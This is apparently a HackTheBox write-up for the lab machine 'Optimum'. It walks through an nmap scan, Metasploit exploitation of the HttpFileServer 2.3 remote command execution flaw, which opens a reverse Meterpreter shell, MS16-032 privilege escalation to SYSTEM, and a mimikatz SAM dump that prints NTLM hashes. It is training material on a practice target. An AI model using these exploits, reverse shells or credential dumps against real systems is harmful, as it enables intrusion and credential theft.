# Optimum | HackTheBox

### 1. Scan
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 02:27 UTC
Nmap scan report for 10.129.47.7
Host is up (0.22s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   215.81 ms 10.10.14.1
2   215.86 ms 10.129.47.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.65 seconds
```
The machine is running Windows with HttpFileServer 2.3.

### 2. Enumerate
Navigating to the file server page shows that it is essentially empty, there are no files on the server. Searching for the server and version shows it has a known remote command execution vulnerability that can be attempted.

### 3. Get a shell
According to the advisory:  
*The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action..*
  
To exploit, the attacker writes a malicious payload to the machine and then executes it using multiple requests.
```bash
msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.47.7      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.48:4444 
[*] Using URL: http://0.0.0.0:8080/0GOYTxJqtp3YtA
[*] Local IP: http://139.59.247.0:8080/0GOYTxJqtp3YtA
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /0GOYTxJqtp3YtA
[*] Sending stage (176195 bytes) to 10.129.47.7
[*] Meterpreter session 1 opened (10.10.14.48:4444 -> 10.129.47.7:49162) at 2020-11-23 02:54:52 +0000
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\ngGBfGKlyea.vbs' on the target
[!] Tried to delete %TEMP%\ngGBfGKlyea.vbs, unknown result

meterpreter > getuid
Server username: OPTIMUM\kostas
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

### 4. Get a system shell
To be honest, not much enumeration needed in this case as I was paying attention and saw the machine was running Windows 2012, in particular it is a build which contains a vulnerable winlogin service (MS16-032).
```bash
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.48      yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.48:9999 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\PrURiNWVUKI.ps1...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2108

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2084
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

S2vArtfKM054PfY5ZQOiSGQiTHLkqIl1
[+] Executed on target machine.
[*] Sending stage (176195 bytes) to 10.129.47.20
[*] Meterpreter session 3 opened (10.10.14.48:9999 -> 10.129.47.20:49163) at 2020-11-23 03:07:05 +0000
[+] Deleted C:\Users\kostas\AppData\Local\Temp\PrURiNWVUKI.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : OPTIMUM
SysKey : 26abbd282f97155f44e222de59a95a7e
Local SID : S-1-5-21-605891470-2991919448-81205106

SAMKey : 17524c894cca9813298b81f79204ca4f

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: d90b270062e8b9f118ab8e0f733df391

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : kostas
  Hash NTLM: fb7c6aab6468ef0383f97a12b78ab8ac
```

### Notes
I created my own HFS exploit (see hfsexploit.py) - it allows for any hosted binary to be uploaded and executed on machine with user-defined arguments.
